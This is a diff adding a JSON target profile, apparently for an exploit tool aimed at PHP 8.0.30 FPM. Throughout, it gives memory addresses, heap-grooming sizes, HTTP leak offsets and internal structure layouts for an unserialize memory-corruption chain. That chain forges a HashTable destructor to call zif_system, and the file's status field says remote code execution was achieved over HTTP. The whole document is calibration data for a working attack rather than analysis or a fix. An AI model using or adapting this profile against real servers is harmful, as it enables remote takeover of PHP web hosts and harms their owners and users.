@@ -1,0 +1,159 @@
+{
+  "name": "php-8.0.30-fpm",
+  "php_version": "8.0.30",
+  "branch": "8.0",
+  "fixed_in": "unknown",
+  "sapi": "fpm",
+  "verified": true,
+  "rce": true,
+  "distro": "debian",
+  "arch": "amd64",
+  "libphp": {
+    "zif_system": "0x359b20",
+    "zval_ptr_dtor": "0x4145e0",
+    "htdata": null
+  },
+  "fpm": {
+    "basic_globals": "0xa14b60",
+    "bg_unserialize_data_off": 3472,
+    "bg_unserialize_level_off": 3480,
+    "struct_size": 8216,
+    "reclaim_pads": [
+      4096,
+      4096
+    ],
+    "reclaim_size": 16384,
+    "oracle": "/proc/<pid>/mem (local lab)",
+    "no_oracle": {
+      "reclaim_pads": [
+        4096,
+        4096
+      ],
+      "reclaim_size": 16384,
+      "candidates": [
+        {
+          "d_off": "0x7f000",
+          "k": "0xfe8"
+        }
+      ],
+      "bases": "chunk from the 2MB-aligned leaked pointer, PIE base validated with a remote endgame; both stable for the FPM master lifetime"
+    },
+    "leak": {
+      "arm_path": "/bigvar.php",
+      "pads": [
+        32768,
+        16384
+      ],
+      "size": 16384,
+      "header_content_off": "0x17e8",
+      "read_len": "0x1c000",
+      "chunk_ptr_off": "0x77f8",
+      "chunk_base_off": "0x8b000",
+      "pie_ptr_off": "0x177c8",
+      "pie_base_off": "0x47425d",
+      "bases": "discovered over HTTP with the calibrate command (no /proc access)"
+    },
+    "growth": {
+      "leak": {
+        "arm_path": "/bigvar.php",
+        "pads": [
+          32768,
+          16384
+        ],
+        "size": 16384,
+        "header_content_off": "0x17e8",
+        "read_len": "0x1c000",
+        "chunk_ptr_off": "0xa3e8",
+        "chunk_base_off": "0x96000",
+        "pie_ptr_off": "0x8b88",
+        "pie_base_off": "0x4e886a",
+        "bases": "discovered over HTTP with the calibrate command (no /proc access)"
+      },
+      "candidates": [
+        {
+          "d_off": "0x81000",
+          "k": "0xfe8"
+        }
+      ],
+      "reclaim_pads": [
+        4096,
+        4096,
+        4096
+      ],
+      "reclaim_size": 16384
+    }
+  },
+  "stages": {},
+  "config": {
+    "memory_limit": 8388608,
+    "display_errors": "On",
+    "session_upload_progress": "On",
+    "workers": 2
+  },
+  "status": "contributor-reported, not independently confirmed — RCE verified over HTTP only (no /proc access): the stale-string leak recovered chunk=0x7fd3b8a00000 and the PIE base 0x557729200000 (leak+0x177c8 -> 0x47425d); the primitive at 0x7f000/0xfe8 was observable through app.php and the forged HashTable destructor executed zif_system (proof: out/out/calib).",
+  "oom_mb": 4,
+  "layout": {
+    "unserialize_data": {
+      "last": 0,
+      "first_dtor": 8,
+      "last_dtor": 16,
+      "allowed_classes": 24,
+      "ref_props": 32,
+      "cur_depth": 40,
+      "max_depth": 48,
+      "entries": 56,
+      "size": 8216
+    },
+    "var_entries": {
+      "used_slots": 0,
+      "next": 8,
+      "data": 16,
+      "max": 1018
+    },
+    "zval": {
+      "value": 0,
+      "type_info": 8,
+      "context": 12,
+      "size": 16
+    },
+    "zend_array": {
+      "gc": 0,
+      "flags": 8,
+      "nTableMask": 12,
+      "arData": 16,
+      "nNumUsed": 24,
+      "nNumOfElements": 28,
+      "nTableSize": 32,
+      "pDestructor": 48
+    },
+    "zend_reference": {
+      "gc": 0,
+      "val": 8,
+      "val_type_info": 16,
+      "sources": 24
+    },
+    "zend_string": {
+      "gc": 0,
+      "h": 8,
+      "len": 16,
+      "val": 24
+    },
+    "zend_execute_data": {
+      "opline": 0,
+      "call": 8,
+      "return_value": 16,
+      "func": 24,
+      "num_args": 44,
+      "arg1": 80
+    },
+    "bucket": {
+      "val": 0,
+      "h": 16,
+      "key": 24
+    },
+    "bg": {
+      "unserialize_data": 3472,
+      "unserialize_level": 3480
+    }
+  }
+}
